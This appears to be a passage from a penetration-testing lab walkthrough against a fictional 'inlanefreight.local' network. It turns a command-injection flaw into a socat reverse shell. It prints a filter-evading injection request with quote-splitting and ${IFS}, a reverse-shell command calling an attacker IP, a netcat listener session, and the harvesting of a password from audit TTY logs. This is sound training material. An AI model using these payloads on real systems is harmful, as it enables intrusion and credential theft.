Now that we've thoroughly enumerated and attacked the external perimeter and uncovered a wealth of findings, we're ready to shift gears and focus on obtaining stable internal network access. Per the SoW document, if we can achieve an internal foothold, the client would like us to see how far we can go up to and including gaining `Domain Admin level access`. In the last section, we worked hard on peeling apart the layers and finding web apps that led to early file read or remote code execution but didn't get us into the internal network. We left off with obtaining RCE on the `monitoring.inlanefreight.local` application after a hard-fought battle against filters and blacklists set in place to try to prevent `Command Injection` attacks.

## Getting a Reverse Shell

As mentioned in the previous section, we can use [Socat](https://linux.die.net/man/1/socat) to establish a reverse shell connection. Our base command will be as follows, but we'll need to tweak it some to get past the filtering:

```
        shellsession
`socat TCP4:10.10.14.5:8443 EXEC:/bin/bash`
```

```
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.83:4444${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=n30poaet29a3icdj6t5tl34ge7
Connection: keep-alive


```

```
nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.15.83] from (UNKNOWN) [10.129.229.147] 51610
whoami
webdev
python3 -c 'import pty; pty.spawn("/bin/bash")'
webdev@dmz01:/var/www/html/monitoring$ ^Z
zsh: suspended  nc -lvnp 4444
```

```
aureport --tty | less
```

with this tool you will be able to get the summary of the logs and it helps you to find valuable info, we found the password for srvadm and su srvadm logged in, grabbed the flag.